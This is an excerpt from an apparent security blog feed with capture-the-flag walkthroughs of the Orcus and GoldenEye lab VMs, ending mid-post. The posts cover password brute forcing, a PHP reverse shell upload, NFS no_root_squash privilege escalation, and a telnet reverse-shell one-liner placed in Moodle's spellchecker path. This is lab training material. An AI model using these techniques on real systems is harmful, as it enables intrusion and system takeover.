<p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
```</p>

<p>Nice Docker twist on this VM! To recap the steps:</p>

<ul>
<li>Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data</li>
<li>the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password</li>
<li>the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key</li>
<li>user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container</li>
</ul>


<p>```</p>

<hr />

<p>/ Your motives for doing whatever good \
| deed you may have in mind will be    |
\ misinterpreted by somebody.          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016 Orcus]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/07/hackfest-2016-orcus/"/>
    <updated>2019-04-07T22:20:06+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/07/hackfest-2016-orcus</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the third machine in the Hackfest series:</p>

<blockquote><p>This is a vulnerable machine i created for the Hackfest 2016 CTF <a href="http://hackfest.ca/">http://hackfest.ca/</a></p>

<p>Difficulty : Hard</p>

<p>Tips:</p>

<p>If youre stuck enumerate more! Seriously take each service running on the system and enumerate them more!</p>

<p>Goals: This machine is intended to take a lot of enumeration and understanding of Linux system.</p>

<p>There are 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box 4. There is something on
this box that is different from the others from this series (Quaoar and Sedna) find why its different</p></blockquote>

<!-- more -->


<p><code>
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
53/tcp    open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 30 disallowed entries (15 shown)
| /exponent.js.php /exponent.js2.php /exponent.php
| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php
| /exponent_version.php /getswversion.php /login.php /overrides.php
| /popup.php /selector.php /site_rss.php /source_selector.php
|_/thumb.php
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE CAPA UIDL SASL RESP-CODES STLS PIPELINING TOP
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      36199/tcp  mountd
|   100005  1,2,3      38727/udp  mountd
|   100021  1,3,4      41463/tcp  nlockmgr
|   100021  1,3,4      43317/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
|_imap-capabilities: have more SASL-IR OK LOGIN-REFERRALS ENABLE capabilities Pre-login LOGINDISABLEDA0001 STARTTLS IDLE listed ID LITERAL+ IMAP4rev1 post-login
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
36199/tcp open  mountd      1-3 (RPC #100005)
41463/tcp open  nlockmgr    1-4 (RPC #100021)
54301/tcp open  mountd      1-3 (RPC #100005)
54471/tcp open  mountd      1-3 (RPC #100005)
</code></p>

<p>The web server greets us with a familiar planet image. In the background, I started some Samba enumeration, but didn&rsquo;t find anything interesting:</p>

<p>```
smbmap -H 192.168.159.131
[+] Finding open SMB ports&hellip;.
[+] Guest SMB session established on 192.168.159.131&hellip;
[+] IP: 192.168.159.131:445 Name: 192.168.159.131</p>

<pre><code>Disk                                                    Permissions
----                                                    -----------
print$                                              NO ACCESS
IPC$                                                NO ACCESS
</code></pre>

<p>```</p>

<p>I prefer to leave the web server for last when there are more vectors available, so before further poking at it, I also checked the if something is shared via the NFS:</p>

<p><code>
showmount -e 192.168.159.131
Export list for 192.168.159.131:
/tmp *
</code></p>

<p>Let&rsquo;s see what we have there:</p>

<p><code>
mount -t nfs 192.168.159.131:/tmp /mnt
root@deck:/mnt# ls -alh
total 76K
drwxrwxrwt 10 root root 4.0K Apr  3  2019 .
drwxr-xr-x 19 root root  36K Mar 15 08:27 ..
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .font-unix
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .ICE-unix
drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-dovecot.service-SEiaO9
drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-systemd-timesyncd.service-2AJ3nv
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .Test-unix
drwx------  2 root root 4.0K Apr  3  2019 vmware-root
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .X11-unix
drwxrwxrwt  2 root root 4.0K Apr  3  2019 .XIM-unix
</code></p>

<p>I looked around, but didn&rsquo;t find anything to continue from, so back to the web server!</p>

<p>Nmap reported lots of entries in the robots.txt file, so let&rsquo;s have a look:</p>

<p>```
User-agent: *
Crawl-delay: 5</p>

<h1>@@@@@@   @@@@@@@    @@@@@@@  @@@  @@@   @@@@@@</h1>

<h1>@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@</h1>

<h1>@@!  @@@  @@!  @@@  !@@       @@!  @@@  !@@</h1>

<h1>!@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!</h1>

<h1>@!@  !@!  @!@!!@!   !@!       @!@  !@!  !!@@!!</h1>

<h1>!@!  !!!  !!@!@!    !!!       !@!  !!!   !!@!!!</h1>

<h1>!!:  !!!  !!: :!!   :!!       !!:  !!!       !:!</h1>

<h1>:!:  !:!  :!:  !:!  :!:       :!:  !:!      !:!</h1>

<h1>::::: ::  ::   :::   ::: :::  ::::: ::  :::: ::</h1>

<h1>: :  :    :   : :   :: :: :   : :  :   :: : :</h1>

<p>Disallow: /exponent.js.php
Disallow: /exponent.js2.php
Disallow: /exponent.php
Disallow: /exponent_bootstrap.php
Disallow: /exponent_constants.php
Disallow: /exponent_php_setup.php
Disallow: /exponent_version.php
Disallow: /getswversion.php
Disallow: /login.php
Disallow: /overrides.php
Disallow: /popup.php
Disallow: /selector.php
Disallow: /site_rss.php
Disallow: /source_selector.php
Disallow: /thumb.php
Disallow: /ABOUT.md
Disallow: /CHANGELOG.md
Disallow: /CREDITS.md
Disallow: /INSTALLATION.md
Disallow: /LICENSE
Disallow: /README.md
Disallow: /RELEASE.md
Disallow: /TODO.md
Disallow: /cgi-bin/
Disallow: /cart/
Disallow: /login/
Disallow: /users/
Disallow: /files/
Disallow: /tmp/
Disallow: /search/</p>

<h1>Sitemap: <a href="http://www.mysite.com/sitemap.xml">http://www.mysite.com/sitemap.xml</a></h1>

<p>```</p>

<p>I looked around and the files point to a Exponent Content Management System installation. Trying the login and other pages gives a message that the site is down for maintenance and database is offline. But another potentially interesting find was <a href="http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php">http://192.168.159.131/tmp/views_c/_0c7aa37c1e5b7386c5d18dba80bb5d3b%5e118e4111302d35936b445390f58fb9f006cda2dd_0.file._maintenance.tpl.php</a> which gives the message &ldquo;no direct access allowed&rdquo;.</p>

<p>I looked for exploits for this CMS, but the interesting ones were from older versions. According to the RELEASE.md file, the version here is 2.3.8. I also found that this version should be vulnerable to CVE-2016-7095, but couldn&rsquo;t find a way to exploit it. Since the VM description emphasized enumeration, I fired up gobuster to see if there&rsquo;s more I might have missed on the web server:</p>

<p><code>
gobuster -u http://192.168.159.131/ -w /usr/share/wordlists/dirb/big.txt
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/FCKeditor (Status: 301)
/LICENSE (Status: 200)
/admin (Status: 301)
/backups (Status: 301)
/cron (Status: 301)
/external (Status: 301)
/files (Status: 301)
/framework (Status: 301)
/install (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/themes (Status: 301)
/tmp (Status: 301)
/webalizer (Status: 200)
/zenphoto (Status: 301)
</code></p>

<p>This is interesting. The first thing I checked was the backups folder.</p>

<p><code>
[PARENTDIR] Parent Directory        -
[ ] SimplePHPQuiz-Backupz.tar.gz    2016-10-31 20:29    210K
[ ] ssh-creds.bak   2016-11-01 21:33    12
</code></p>

<p>Got a Forbidden error when trying to access the ssh creds file, but I was able to download the SimplePHPQuiz one. It contained the files for another application that doesn&rsquo;t seem to be installed. I did a search for passwords and got a hit:</p>

<p><code>
grep -l -r password *
css/bootstrap.css.map
includes/db_conn.php
</code></p>

<p>Inside db_conn.php I found some database credentials:</p>

<p><code>php
//Set the database access information as constants
DEFINE ('DB_USER', 'dbuser');
DEFINE ('DB_PASSWORD', 'dbpassword');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'quizdb');
</code></p>

<p>Moving on. The /cron folder contains a bunch of PHP files that I couldn&rsquo;t get anything interesting from. The /framework folder was another dead end. But when I went to /zenphoto, I saw that the Zenphoto 1.4.10 installation needed a last step of providing database credentials. It was configured with root@localhost and it got an access denied. In searchsploit I saw a local file inclusion exploit for this version of Zenphoto, so I tried to complete the installation with the previously discovered credentials. It worked and I was then prompted to create an admin user, which I did:</p>

<p><img class="center" src="/images/pentest/orcus/admin.png" title="&lsquo;zenphoto admin&rsquo; &lsquo;zenphoto admin&rsquo;" ></p>

<p>Next I looked at the LFI exploit:</p>

<p>```
Exploit: ZenPhoto 1.4.10 &ndash; Local File Inclusion</p>

<pre><code>  URL: https://www.exploit-db.com/exploits/38841/
 Path: /usr/share/exploitdb/exploits/php/webapps/38841.txt
</code></pre>

<h1>Vulnerability Details:</h1>

<p>Zen Photos pluginDoc.php PHP file is vulnerable to local file inclusion
that allows attackers
to read arbitrary server files outside of the current web directory by
injecting &ldquo;../&rdquo; directory traversal
characters, which can lead to sensitive information disclosure, code
execution or DOS on the victims web server.</p>

<h1>Local File Inclusion Codes:</h1>

<p><a href="http://localhost/zenphoto-zenphoto-1.4.10/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../xampp">http://localhost/zenphoto-zenphoto-1.4.10/zp-core/pluginDoc.php?thirdparty=1&amp;extension=../../../xampp</a>
/phpinfo
```</p>

<p>The path didn&rsquo;t work for me. I kept looking around while logged in as admin and noticed a file upload plugin:</p>

<p><img class="center" src="/images/pentest/orcus/plugins.png" title="&lsquo;zenphoto upload&rsquo; &lsquo;zenphoto upload&rsquo;" ></p>

<p>I enabled the elFinder plugin and now I could upload arbitrary files:</p>

<p><img class="center" src="/images/pentest/orcus/upload.png" title="&lsquo;zenphoto shell&rsquo; &lsquo;zenphoto shell&rsquo;" ></p>

<h2>Flag #1 &ndash; Standard shell</h2>

<p>With the PHP reverse shell uploaded, all I had to do was to go to it in the /uploaded directory and I got a shell and the first flag:</p>

<p><code>
nc -vnlp 9000
listening on [any] 9000 ...
connect to [192.168.159.129] from (UNKNOWN) [192.168.159.131] 38806
Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux
 12:02:20 up 25 min,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls /var/www
9bd556e5c961356857d6d527a7973560-zen-cart-v1.5.4-12302014.zip
a0c4f0d176f87ceda9b9890af09ed644-Adem-master.zip
b873fef091715964d207daa19d320a99-zenphoto-zenphoto-1.4.10.tar.gz
flag.txt
html
zenphoto-zenphoto-1.4.10
$ cat flag.txt
868c889965b7ada547fae81f922e45c4
</code></p>

<h2>Flag #2 &ndash; Getting root</h2>

<p>Remembering the NFS share that didn&rsquo;t get us anywhere earlier, I checked the <strong>/etc/exports</strong> file and found something really interesting and good for us:</p>

<p><code>
/tmp *(rw,no_root_squash)
</code></p>

<p>Not only we had write permissions on the share, which I haven&rsquo;t tried, but no root squash means that our root user can leave a SUID shell owned by root on the share for our www-data user after we copy it there with our low-privilege shell:</p>

<p><code>
$ cp /bin/bash root
$ ls -l root
-rwxr-xr-x 1 www-data www-data 1109564 Apr  5 12:13 root
</code></p>

<p>Now chown to root:</p>

<p><code>
root@deck:/mnt# chown root:root root
root@deck:/mnt# chmod +s root
root@deck:/mnt# ls -l root
-rwsr-sr-x 1 root root 1109564 Apr  5  2019 root
</code></p>

<p>Execute the binary and you have root on the box and the 2nd flag:</p>

<p><code>
whoami
root
ls /root
flag.txt
cat /root/flag.txt
807307b49314f822985d0410de7d8bfe
</code></p>

<p>I didn&rsquo;t poke around for more flags, so this is for this box!</p>

<p>```</p>

<hr />

<p>/ All generalizations are false, \
| including this one.            |
|                                |
\ &mdash; Mark Twain                  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GoldenEye 007]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/02/goldeneye-007/"/>
    <updated>2019-04-02T21:57:39+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/02/goldeneye-007</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired by a James Bond movie:</p>

<blockquote><p>I recently got done creating an OSCP type vulnerable machine that&rsquo;s themed after the great James Bond film (and even better n64 game) GoldenEye.
The goal is to get root and capture the secret GoldenEye codes &ndash; flag.txt.</p>

<p>I&rsquo;d rate it as Intermediate, it has a good variety of techniques needed to get root &ndash; no exploit development/buffer overflows. After completing
the OSCP I think this would be a great one to practice on, plus there&rsquo;s a hint of CTF flavor.</p></blockquote>

<!-- more -->


<p><code>
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE CAPA STLS UIDL PIPELINING RESP-CODES TOP
|_ssl-date: TLS randomness does not represent time
</code></p>

<p>Navigating to the web server takes you to this screen:</p>

<p><img class="center" src="/images/pentest/goldeneye/web.png" title="&lsquo;goldeneye web&rsquo; &lsquo;goldeneye web&rsquo;" ></p>

<p>In the source code of the page there&rsquo;s a linked <em>terminal.js</em> file. Viewing that reveals some interesting comments:</p>

<p><code>html
//
//Boris, make sure you update your default password.
//My sources say MI6 maybe planning to infiltrate.
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
//
//BTW Natalya says she can break your codes
//
</code></p>

<p>So we have a HTML encoded password which decodes to <code>InvincibleHack3r</code>. Now we can go to <em>/sev-home</em> and log in as boris with this password.</p>

<p><img class="center" src="/images/pentest/goldeneye/goldeneye.png" title="&lsquo;goldeneye login&rsquo; &lsquo;goldeneye login&rsquo;" ></p>

<p>We can now make use of that POP3 service on port 55007. Boris' credentials didn&rsquo;t work though. I used Nikto to further look at the web server and got an interesting hit:</p>

<p><code>
+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
</code></p>

<p>Going to that page wasn&rsquo;t immediately useful though, but maybe some of the information could be used further:</p>

<p><img class="center" src="/images/pentest/goldeneye/splashadmin.png" title="&lsquo;splashadmin&rsquo; &lsquo;splashadmin&rsquo;" ></p>

<p>With nothing else to go from, I attempted to bruteforce the mail login credentials for boris with the Metasploit <em>scanner/pop3/pop3_login</em> module and the <em>fasttrack.txt</em> wordlist:</p>

<p><code>
[+] 192.168.159.130:55007 - 192.168.159.130:55007 - Success: 'boris:secret1!' '+OK Logged in.  '
</code></p>

<p>So now we have credentials for Boris' mail and I was able to read his mails:</p>

<p>```
nc 192.168.159.130 55007
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#114;&#x6f;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#x6c;&#100;&#x65;&#x6e;&#101;&#x79;&#x65;">&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;&#46;&#x67;&#111;&#x6c;&#100;&#101;&#110;&#x65;&#121;&#101;</a>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])</p>

<pre><code>by ubuntu (Postfix) with SMTP id D9E47454B1
for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
</code></pre>

<p>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#114;&#111;&#111;&#x74;&#64;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#x6c;&#x64;&#x65;&#x6e;&#101;&#x79;&#x65;">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#48;&#46;&#49;&#x2e;&#x67;&#111;&#108;&#100;&#101;&#x6e;&#x65;&#x79;&#x65;</a></p>

<p>Boris, this is admin. You can electronically communicate to co-workers and students here. I&rsquo;m not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: &lt;natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])</p>

<pre><code>by ubuntu (Postfix) with ESMTP id C3F2B454B1
for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
</code></pre>

<p>Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu</p>

<p>Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x61;&#x6c;&#x65;&#x63;&#x40;&#106;&#x61;&#x6e;&#117;&#115;&#x2e;&#98;&#111;&#x73;&#x73;">&#x61;&#108;&#101;&#x63;&#64;&#x6a;&#x61;&#110;&#117;&#x73;&#46;&#x62;&#x6f;&#x73;&#115;</a>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])</p>

<pre><code>by ubuntu (Postfix) with ESMTP id 4B9F4454B1
for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
</code></pre>

<p>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x61;&#108;&#x65;&#x63;&#x40;&#x6a;&#x61;&#x6e;&#117;&#x73;&#x2e;&#98;&#111;&#x73;&#x73;">&#x61;&#x6c;&#101;&#x63;&#64;&#x6a;&#97;&#x6e;&#x75;&#x73;&#x2e;&#x62;&#111;&#115;&#x73;</a></p>

<p>Boris,</p>

<p>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</p>

<p>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages&hellip;.</p>

<p>PS &ndash; Keep security tight or we will be compromised.
```</p>

<p>We now know to look for access codes once we get a shell on the target. We also learned there&rsquo;s another username on the ubuntu domain: natalya. So I kicked off the bruteforce for her account as well, this time with Hydra, because I wasn&rsquo;t happy with the speed of the Metasploit module.</p>

<p><code>
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.159.130 -s 55007 pop3 -f
[55007][pop3] host: 192.168.159.130   login: natalya   password: bird
</code></p>

<p>Got lucky with natalya as well. Now back to reading emails:</p>

<p>```
nc 192.168.159.130 55007
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: &lt;root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])</p>

<pre><code>by ubuntu (Postfix) with ESMTP id D5EDA454B1
for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
</code></pre>

<p>Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu</p>

<p>Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</p>

<p>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: &lt;root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])</p>

<pre><code>by ubuntu (Postfix) with SMTP id 17C96454B1
for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
</code></pre>

<p>Message-Id: &lt;20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu</p>

<p>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&rsquo;s related to security&hellip;even if it&rsquo;s not, just enter it in under the guise of &ldquo;security&rdquo;&hellip;it&rsquo;ll get the change order escalated without much hassle :)</p>

<p>Ok, user creds are:</p>

<p>username: xenia
password: RCP90rulez!</p>

<p>Boris verified her as a valid contractor so just create the account ok?</p>

<p>And if you didn&rsquo;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network&hellip;.</p>

<p>Since you&rsquo;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```</p>

<p>Now we&rsquo;ve learned some interesting things..it seems Boris is a double agent! We now have a new set of credentials: <code>xenia:RCP90rulez!</code> and the internal domain for which we have to add an entry in our hosts file. With that done, going to the URL took me to a training portal:</p>

<p><img class="center" src="/images/pentest/goldeneye/moodle.png" title="&lsquo;moodle&rsquo; &lsquo;moodle&rsquo;" ></p>

<p>We can log in as Xenia and find a message on the platform:</p>

<p>```
Tuesday, 24 April 2018
09:24 PM: Greetings Xenia,</p>

<p>As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.</p>

<p>My email username is&hellip;</p>

<p>doak</p>

<p>Thank you,</p>

<p>Cheers,</p>

<p>Dr. Doak &ldquo;The Doctor&rdquo;
```</p>

<p>We have a new mail username and by now we know what&rsquo;s coming..</p>

<p><code>
[55007][pop3] host: 192.168.159.130   login: doak   password: goat
</code></p>

<p>There&rsquo;s only one mail, but it contains portal credentials:</p>

<p>```
Return-Path: &lt;doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])</p>

<pre><code>by ubuntu (Postfix) with SMTP id 97DC24549D
for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
</code></pre>

<p>Message-Id: &lt;20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu</p>

<p>James,
If you&rsquo;re reading this, congrats you&rsquo;ve gotten this far. You know how tradecraft works right?</p>

<p>Because I don&rsquo;t. Go to our training site and login to my account&hellip;.dig until you can exfiltrate further information&hellip;&hellip;</p>

<p>username: dr_doak
password: 4England!
```</p>

<p>Look around until you find a secret file inside My private files:</p>

<p><img class="center" src="/images/pentest/goldeneye/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret&rsquo;" ></p>

<p>The contents are:</p>

<p>```
007,</p>

<p>I was able to capture this apps adm1n cr3ds through clear txt.</p>

<p>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.</p>

<p>Something juicy is located here: /dir007key/for-007.jpg</p>

<p>Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```</p>

<p>The image most likely has hidden data within:</p>

<p><img class="center" src="/images/pentest/goldeneye/for-007.jpg" title="&lsquo;message for 007&rsquo; &lsquo;message for 007&rsquo;" ></p>

<p>Running strings on the image reveals a base64 string: <em>eFdpbnRlcjE5OTV4IQ==</em>, which is decoded to <code>xWinter1995x!</code>. Now we can log in as admin to the platform. After some more recon, it seems that we can achieve RCE with a Metasploit exploit for Moodle:</p>

<blockquote><p>Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point
to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands
in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation
vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that
of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version
2.5.2 and 2.2.3.</p></blockquote>

<p>The admin account we hijacked has the necessary privileges, so we can use this exploit.</p>

<p>```
Module options (exploit/multi/http/moodle_cmd_exec):</p>

<p>   Name       Current Setting        Required  Description</p>

<hr />

<p>   PASSWORD   xWinter1995x!          yes       Password to authenticate with
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOSTS     severnaya-station.com  yes       The target address range or CIDR identifier
   RPORT      80                     yes       The target port (TCP)
   SESSKEY                           no        The session key of the user to impersonate
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
   USERNAME   admin                  yes       Username to authenticate with
   VHOST                             no        HTTP server virtual host
```</p>

<p>It seemed straightforward, but the exploit failed to run for me. I looked over the source code and saw that the spellcheck engine that is set by the exploit is PSpellShell. By default on the site, the TinyMCE HTML editor spell engine selected was Google Spell. So I manually changed this and ran the exploit again, but it still didn&rsquo;t work. So I did it manually. Recall this part:</p>

<blockquote><p>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application
upon spellchecking requests</p></blockquote>

<p>Under Server &ndash;> System paths, I edited the <strong>Path to aspell</strong> field with this reverse shell one-liner (had to cycle through a couple before finding one that worked): <code>sh -c &lsquo;(mknod /tmp/backpipe p 2> /dev/null &amp;&amp; /bin/bash 0</tmp/backpipe | telnet 192.168.159.129 8080 1>/tmp/backpipe &amp;)&rsquo;</code></p>

<p>Now if you go to Blogs and add a new entry, you can invoke the spellchecker by clicking on the spellcheck button:</p>

<p><img class="center" src="/images/pentest/goldeneye/spellcheck.png" title="&lsquo;spellcheck&rsquo; &lsquo;spellcheck&rsquo;" ></p>

<p>And you should receive a shell on your listener. I upgraded it to a proper one:</p>

<p><code>
nc -vnlp 8080
listening on [any] 8080 ...
connect to [192.168.159.129] from (UNKNOWN) [192.168.159.130] 54586
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$
</code></p>

<p>The kernel version is really old:</p>

<p><code>
uname -a
